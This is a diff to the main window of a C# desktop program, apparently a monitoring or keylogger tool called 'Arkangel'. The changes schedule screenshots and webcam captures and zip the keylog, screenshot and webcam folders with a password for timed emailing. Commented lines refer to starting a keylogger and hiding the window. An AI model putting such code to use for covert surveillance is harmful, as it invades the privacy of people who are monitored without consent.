@@ -41,8 +41,9 @@ namespace Arkangel
        
         public MainWindow()
         {
-
+            
             InitializeComponent();
+           
            // ProcessStartInfo _startkeylog = startkeylog();
             if (mainPanel.Children.ToString() != "Dashboard")
             {
@@ -63,6 +64,9 @@ namespace Arkangel
             //    myProcess.Start();
             //}
             //catch { };
+
+
+
             //Screenshot
 
            
@@ -78,16 +82,34 @@ namespace Arkangel
                     SQLiteDataReader data = sqlComm_Screenshot.ExecuteReader();
                     while (data.Read())
                     {
-                        
                         int.TryParse(data["enable"].ToString(),out Screenshot_enable);
                         int.TryParse(data["hours"].ToString(), out Screenshot_hours);
                         int.TryParse(data["minutes"].ToString(), out Screenshot_minutes);
+                        if (data["enDel"].ToString() == "1")
+                        {
+                            /// calculate time and dele folder webcam
+                            DateTime temp = DateTime.Parse(data["datetime"].ToString());
+                            double days = Double.Parse(data["daysDel"].ToString());
+
+                            if (temp.AddDays(days).CompareTo(DateTime.Now) >= 0)
+                            {
+                                if (Directory.Exists("..\\..\\Screenshot"))
+                                {
+                                    Directory.Delete("..\\..\\Screenshot", true);
+                                    Console.WriteLine("Delete successful!");
+                                }
+                            }
+                        }
                     }
                     // start timer screenshot if enable
                     if (Screenshot_enable == 1)
                     {
                         Functions.SetTimerScreenShot(Screenshot_hours * 60 * 60 * 1000 + Screenshot_minutes * 60 * 1000);
                         aTimer_scrshot.Start();
+                    }
+                    else
+                    {
+                        aTimer_scrshot = new System.Timers.Timer();
                     }
 
                     //----------------------------------//
@@ -100,19 +122,22 @@ namespace Arkangel
                         int.TryParse(wc["enable"].ToString(),out Webcam_enable);
                         int.TryParse(wc["hours"].ToString(), out Webcam_hours);
                         int.TryParse(wc["minutes"].ToString(), out Webcam_minutes);
-
-                        /// calculate time and dele folder webcam
-                        DateTime temp = DateTime.Parse(wc["datetime"].ToString());
-                        double days = Double.Parse(wc["days"].ToString());
-
-                        if (temp.AddDays(days).CompareTo(DateTime.Now) >= 0)
+                        if (wc["enDelEvery"].ToString()=="1")
                         {
-                            if (Directory.Exists("..\\..\\Webcam"))
+                            /// calculate time and dele folder webcam
+                            DateTime temp = DateTime.Parse(wc["datetime"].ToString());
+                            double days = Double.Parse(wc["days"].ToString());
+
+                            if (temp.AddDays(days).CompareTo(DateTime.Now) >= 0)
                             {
-                                Directory.Delete("..\\..\\Webcam", true);
-                                Console.WriteLine("Delete successful!");
+                                if (Directory.Exists("..\\..\\Webcam"))
+                                {
+                                    Directory.Delete("..\\..\\Webcam", true);
+                                    Console.WriteLine("Delete successful!");
+                                }
                             }
                         }
+                        
                     }
                     // Start timer for webcam
                     if (Webcam_enable == 1)
@@ -130,12 +155,45 @@ namespace Arkangel
 
             //Mail
 
+            string enable_mail = "";
+            int hours = 0;
+            int minutes = 0;
+            string password = null;
+            using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
+            {
+                connect.Open();
+                using (SQLiteCommand fmd = connect.CreateCommand())
+                {
+                    SQLiteCommand sqlComm_Alert = new SQLiteCommand(@"SELECT * FROM Email,current_user WHERE Email.id = current_user.id", connect);
+                    SQLiteDataReader data = sqlComm_Alert.ExecuteReader();
+                    while (data.Read())
+                    {
+                        enable_mail = data["enable"].ToString();
+                        int.TryParse(data["hours"].ToString(), out hours);
+                        int.TryParse(data["minutes"].ToString(), out minutes);
+                        password = data["zipPasswd"].ToString();
+                    }
+                }
+            }
+            if (enable_mail=="1")
+            {
+                Functions.SetTimerSendMail(hours * 60 * 60 * 1000 + minutes * 60 * 1000);
+                Functions.ZipFolder(@"..\..\Screenshot", password);
+                Functions.ZipFolder(@"..\..\Webcam", password);
+                Functions.ZipFolder(@"..\..\Keylog", password);
+                aTimer_sendMail.Start();
+            }
+            else
+            {
+                aTimer_sendMail = new System.Timers.Timer();
+            }
+            //---------------------------------//
 
             //FTP
 
-          //  Closing += new System.ComponentModel.CancelEventHandler(windowl);
-
-
+            //  Closing += new System.ComponentModel.CancelEventHandler(windowl);
+            
+            //Hide();
         }
         private IntPtr _windowHandle;
         private HwndSource _source;
@@ -211,6 +269,16 @@ namespace Arkangel
                 catch (Exception ex)
                 {
                     Console.WriteLine(ex.ToString());
+                }
+                using (SQLiteConnection connect = new SQLiteConnection(@"Data Source=..\..\database.db"))
+                {
+                    connect.Open();
+                    using (SQLiteCommand fmd = connect.CreateCommand())
+                    {
+                        SQLiteCommand getid = new SQLiteCommand(@"UPDATE current_user SET id= NULL", connect);
+                        getid.ExecuteNonQuery();
+                    }
+                    connect.Close();
                 }
                 LoginForm loginForm = new LoginForm();
                 loginForm.Show();
